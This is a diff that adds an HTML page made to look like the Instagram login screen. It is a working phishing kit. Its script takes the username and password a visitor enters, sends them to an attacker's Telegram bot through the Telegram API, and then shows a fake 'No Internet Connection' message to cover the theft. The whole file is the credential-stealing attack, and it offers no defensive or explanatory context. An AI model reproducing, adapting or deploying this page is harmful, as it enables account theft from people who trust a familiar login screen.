@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="password" id="password" placeholder="Password">
+        <button type="submit" id="submit">Log In</button>
+      </form>
+      <a href="#" class="forgot">Forgot password?</a>
+      <div class="divider">
+        <hr><span>OR</span><hr>
+      </div>
+      <button class="create">Create new account</button>
+    </div>
+  </div>
+
+  <script>
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    const chatId = getQueryParam('id');  
+    const botToken = "YOUR_BOT_TOKEN";  
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      if (username === "" || password === "") {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      if (!chatId) {
+        alert("Error: Missing chat ID.");
+        return;
+      }
+
+      const message = `Instagram Login\nUsername: ${username}\nPassword: ${password}`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          // Show No Internet Page
+          document.body.innerHTML = `
+            <div class="error-container">
+              <img src="https://cdn-icons-png.flaticon.com/512/463/463612.png" alt="Error Icon">
+              <h2>No Internet Connection</h2>
+              <p>Try again later.</p>
+            </div>
+          `;
+        } else {
+          alert("Failed to send details.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("An error occurred.");
+      });
+    });
+  </script>
+</body>
+        </html>
